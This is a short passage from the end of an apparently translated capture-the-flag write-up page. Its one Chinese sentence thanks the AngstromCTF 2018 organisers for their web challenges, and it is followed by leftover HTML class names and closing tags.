jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我想真诚地感谢AngstromCTF 2018组织者为所有这些好的网络问题。没有AngstromCTF，这整个学习机会是不可能的。</p></div></div>    
</body>
</html>